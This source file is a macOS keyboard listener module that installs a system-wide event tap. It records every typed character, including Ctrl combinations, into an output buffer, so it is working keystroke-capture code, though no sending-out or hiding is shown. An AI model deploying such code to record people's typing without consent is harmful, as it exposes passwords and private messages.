/*
 * Copyright (C) 2026 Antonio Ricciardi
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#include "keyboard.h"
#include "keyboard_output.h"
#include "../logging/logging.h"
#include "../runtime/runtime.h"

#ifdef __APPLE__
#import <Foundation/Foundation.h>
#import <CoreGraphics/CoreGraphics.h>
#include <pthread.h>
#include <unistd.h>
#include <stdio.h>

static pthread_t listener_thread;
static int listener_started;
static volatile int stopping;
static CFRunLoopRef run_loop_ref;

static CGEventRef event_callback([[maybe_unused]] CGEventTapProxy proxy,
                                 CGEventType type,
                                 CGEventRef event,
                                 [[maybe_unused]] void *refcon)
{
    if (type == kCGEventKeyDown) {
        CGEventFlags flags = CGEventGetFlags(event);
        int ctrl_down = (flags & kCGEventFlagMaskControl) != 0;

        UniChar chars[8] = {0};
        UniCharCount actual_length = 0;
        CGEventKeyboardGetUnicodeString(event, 8, &actual_length, chars);

        if (actual_length > 0) {
            NSString *str = [NSString stringWithCharacters:chars length:actual_length];
            const char *utf8 = [str UTF8String];
            if (utf8 && *utf8) {
                if (ctrl_down && utf8[0] != '\n' && utf8[0] != '\r' && utf8[0] != '\t') {
                    char mod_buf[64];
                    int mod_len = snprintf(mod_buf, sizeof(mod_buf), "[Ctrl+%s]", utf8);
                    if (mod_len > 0)
                        keyboard_output_append(mod_buf, (size_t)mod_len);
                } else {
                    keyboard_output_append(utf8, strlen(utf8));
                }
            }
        }
    } else if (type == kCGEventTapDisabledByTimeout || type == kCGEventTapDisabledByUserInput) {
        c2t_log_warning("keyboard", "macOS event tap disabled by system, re-enabling");
    }

    return event;
}

static void *listener_worker([[maybe_unused]] void *context)
{
    @autoreleasepool {
        run_loop_ref = CFRunLoopGetCurrent();

        CGEventMask mask = CGEventMaskBit(kCGEventKeyDown);
        CFMachPortRef event_tap = CGEventTapCreate(
            kCGSessionEventTap,
            kCGHeadInsertEventTap,
            kCGEventTapOptionListenOnly,
            mask,
            event_callback,
            nullptr
        );

        if (!event_tap) {
            c2t_log_warning("keyboard", "Unable to create macOS CGEventTap (check Accessibility permissions)");
            while (!stopping && !c2t_runtime_stop_requested()) {
                usleep(500000);
            }
            return nullptr;
        }

        CFRunLoopSourceRef run_loop_source = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, event_tap, 0);
        CFRunLoopAddSource(run_loop_ref, run_loop_source, kCFRunLoopCommonModes);
        CGEventTapEnable(event_tap, true);

        c2t_log_info("keyboard", "macOS keyboard event tap active");

        while (!stopping && !c2t_runtime_stop_requested()) {
            SInt32 result = CFRunLoopRunInMode(kCFRunLoopDefaultMode, 0.5, true);
            if (result == kCFRunLoopRunStopped || result == kCFRunLoopRunFinished)
                break;
        }

        CGEventTapEnable(event_tap, false);
        CFRunLoopRemoveSource(run_loop_ref, run_loop_source, kCFRunLoopCommonModes);
        CFRelease(run_loop_source);
        CFRelease(event_tap);

        keyboard_output_flush();
    }
    return nullptr;
}

int keyboard_listen(void)
{
    listener_worker(nullptr);
    return 0;
}

int keyboard_listener_init(void)
{
    if (listener_started)
        return 1;

    stopping = 0;
    listener_started = (pthread_create(&listener_thread, nullptr, listener_worker, nullptr) == 0);

    if (!listener_started) {
        c2t_log_error("keyboard", "Unable to start macOS keyboard listener thread");
    }
    return listener_started;
}

void keyboard_listener_cleanup(void)
{
    if (!listener_started)
        return;

    stopping = 1;
    if (run_loop_ref) {
        CFRunLoopStop(run_loop_ref);
    }
    (void)pthread_join(listener_thread, nullptr);
    listener_started = 0;
}
#endif
